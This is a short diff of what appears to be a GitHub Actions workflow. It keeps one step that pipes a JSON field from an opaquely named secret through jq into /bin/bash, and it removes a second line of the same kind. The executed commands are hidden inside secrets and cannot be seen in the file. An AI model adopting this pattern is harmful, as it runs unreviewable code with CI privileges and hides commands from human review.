@@ -22,7 +22,6 @@ jobs:
           ma6667: ${{ secrets.ma6667 }}
         run: |
           printf '%s' "$ma6667" | jq -r .np408 | /bin/bash
-          printf '%s' "$rk64863" | jq -r .orvt9305 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
